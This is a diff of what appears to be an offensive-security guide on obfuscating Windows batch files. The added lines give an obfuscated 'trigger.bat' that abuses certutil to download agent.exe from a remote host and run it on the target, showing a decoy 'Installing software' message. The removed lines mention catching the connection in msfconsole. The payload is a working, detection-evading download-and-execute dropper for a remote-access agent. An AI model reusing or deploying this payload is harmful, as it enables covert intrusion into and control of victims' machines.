@@ -181,7 +181,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
 ---
 
-      TODO: [ certutil ] aditional download/execute remote method
+      [ certutil ] aditional download/execute remote method
       Sometimes we need to use non-conventional methods to deliver our agent to target
       system and bypass detection, in this situation certutil can be an ussefull method.
 
@@ -203,19 +203,17 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
 <br />
 
-- File **certutil.bat** to be executed in target system
+- File **trigger.bat** to be executed in target system
 
       @echo off
-      sEt e=!h&& sEt c=db&& sEt a=0x
+      sEt !h=e
+      sEt db=c
+      sEt 0x=a
       echo [+] Please Wait, Installing software ..
-      ;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%0C%tIl.%!h%^xe -u^R%Ac%l%db%%0x%ch%!h% -sP%nF%l^I%O%t -f ht%0D%tp://192.168.1.71/%0x%g%!h%Nt.E^x%!h% %0x%Ge%T%N^t.%!h%^xE && s^t%0x%r%1K%T %0x%"g"%!h%Nt.e%1H%x%!h%
+      ;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%A1%tIl.%!h%^xe "-"u^R%A0%l%db%Ac^h%!h% "-"sP%A0%l^i%A8%T -f ht%A0%tp://19%d0%2.1%A0%68.1.71/agent.exe agent.exe && start agent.exe
       exit
 
-![batch obfuscation certutil.bat](http://i.)
-
-- Recibing the connection in msfconsole 
-
-![batch obfuscation certutil.bat](http://i.)
+![batch obfuscation certutil.bat](http://i.cubeupload.com/PXBWog.jpg)
 
 ---
 
